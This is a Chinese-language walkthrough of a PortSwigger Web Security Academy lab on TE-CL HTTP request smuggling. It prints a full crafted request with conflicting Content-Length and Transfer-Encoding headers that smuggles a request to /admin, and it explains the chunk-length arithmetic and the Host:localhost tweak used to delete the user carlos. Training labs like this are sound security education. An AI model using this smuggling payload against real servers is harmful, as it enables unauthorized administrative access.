#### TE-CL绕过前端服务器安全控制

同上面实验相反，前端服务器识别`Transfer-Encoding`，后端服务器识别`Content-Length`

**实验地址**：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

**实验描述**

本实验包含一个前端和后端服务器，后端服务器不支持`Transfer-Encoding`分块传输。现有一个管理员面板/admin，但被限制直接访问。

要完成本实验，需向后端服务器走私一个http请求以访问到管理员系统并删除名为`carlos`的用户。

**实验过程**

构造走私请求，这里构造请求同上面实验有些差别

```bash
POST / HTTP/1.1
Host: acc11f291f28854680882dae00df00bf.web-security-academy.net
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=DHsv0QPpKqKpsxRdjanyv0OdA5CUY9cn
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0

```

构造请求，提示需要添加`Host:localhost`

![](images/security_wiki/15905478983458.png)


如果对此处请求体构造有疑问可以查看chunk传输数据的格式

> chunk传输数据格式如下，其中size的值由16进制表示。
> 
> ```
> >[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0[\r\n][\r\n]]
> >
> 
> ```

因而这里60对应的十进制是：96。恰好等于60以下到0以上数据的长度（包括\r\n）

此处需说明一点，请求包中chunk分块传输的数据库长度必须正确，同时走私请求中的Content-Length长度也需保证正确，否则会提示无法识别或非法请求。

![](images/security_wiki/15905479073647.png)


添加`Host:localhost`并修改数据块长度后重新发包

![](images/security_wiki/15905479186221.png)


修改走私请求为GET方式，多次发送最终成功删除用户。

![](images/security_wiki/15905479256682.png)


